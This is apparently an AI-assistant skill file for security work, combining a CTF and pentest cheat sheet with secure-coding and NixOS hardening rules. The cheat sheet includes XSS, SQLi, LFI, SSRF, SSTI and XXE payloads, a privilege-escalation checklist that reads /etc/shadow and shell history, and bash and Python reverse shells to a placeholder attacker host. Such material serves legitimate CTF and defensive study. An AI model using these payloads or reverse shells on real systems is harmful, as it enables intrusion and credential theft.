---
name: security
description: Use for CTF challenges, security research, penetration testing, defensive hardening, vulnerability analysis, or secure coding review. Triggers on: CTF, pentest, exploit, vulnerability, XSS, SQLi, RCE, CVE, reverse shell, privilege escalation, OSINT, forensics, security audit.
---

# Security

## Context rules

- Offensive work: Kali VM only, never on host NixOS system
- CTF / authorized testing context assumed — if ambiguous, verify scope first
- Defensive hardening: always applicable to NixOS host
- Never assist with: DoS attacks, supply chain compromise, mass targeting, detection evasion for malicious purposes

## CTF methodology

### Recon first
```bash
# Network scan
nmap -sC -sV -oA scan $TARGET
nmap -p- --min-rate 5000 $TARGET  # all ports fast

# Web enum
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Subdomain enum
subfinder -d $DOMAIN | httpx -silent
```

### Web vulnerabilities
```
XSS:       <script>alert(1)</script>  →  <img src=x onerror=alert(1)>  →  DOM-based
SQLi:      ' OR 1=1--   →  UNION SELECT   →  blind time-based
LFI:       ../../etc/passwd   →  PHP wrappers php://filter/convert.base64-encode
SSRF:      http://169.254.169.254/latest/meta-data/  →  internal services
SSTI:      {{7*7}}  →  {{config}}  →  RCE via template engine
XXE:       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

### Linux privesc checklist
```bash
sudo -l                                    # sudo permissions
find / -perm -4000 2>/dev/null             # SUID binaries
cat /etc/crontab; ls /etc/cron.*           # cron jobs
ps aux; ss -tlnp                           # running services, listening ports
cat /etc/passwd; cat /etc/shadow           # user enumeration
find / -writable -type f 2>/dev/null       # writable files
env; printenv                              # environment variables
history; cat ~/.bash_history               # command history
```

GTFOBins: check any SUID/sudo binary at gtfobins.github.io

### Reverse shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh"])'

# Shell stabilization after catching
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg
# Then: export TERM=xterm
```

### Crypto CTF
- Identify cipher: frequency analysis, key length test (IC), base64/hex encoding
- RSA: small e (cube root), common modulus, factor n with known p or d
- Hash cracking: `hashcat -m 0 hash.txt rockyou.txt` (md5=0, sha256=1400, bcrypt=3200)
- Padding oracle: byte-at-a-time CBC decryption

### Forensics
```bash
file suspicious          # identify type regardless of extension
strings -n 8 binary      # human-readable strings
binwalk -e firmware.bin  # extract embedded files
foremost -i disk.img     # file carving
exiftool photo.jpg       # metadata
stegsolve / zsteg / steghide  # image steganography
volatility3 -f mem.raw   # memory forensics
```

## Secure coding

### Input validation
```php
// Never trust user input — validate at boundaries
$id = filter_var($request->input('id'), FILTER_VALIDATE_INT);
if (!$id) abort(400);

// SQL — parameterized queries, never string concatenation
$user = DB::select('SELECT * FROM users WHERE id = ?', [$id]);

// Command execution — use arrays, never shell=True with user data
$result = Process::run(['convert', $inputPath, $outputPath]);
```

### Authentication / session
- Passwords: bcrypt cost 12+, never MD5/SHA1
- Sessions: HttpOnly + Secure + SameSite=Strict cookies
- CSRF: token per session, verify on every state-changing request
- Rate limit login: 5 attempts / minute per IP
- JWT: verify signature, check `exp`, use RS256 not HS256 for distributed systems

### Headers (web servers)
```
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

## NixOS hardening (host system)

Covered by `/nix` skill + security modules. Key rules:
- AppArmor: 2-week complain mode before enforce — don't rush
- nftables: stateful, `ct state invalid drop` before ICMP
- Kernel params: `kernel.dmesg_restrict=1`, `kernel.kptr_restrict=2`
- `/proc` hardening: `hidepid=2` — processes not visible cross-user
- LUKS2 + TPM2: already configured, don't modify PCR bindings
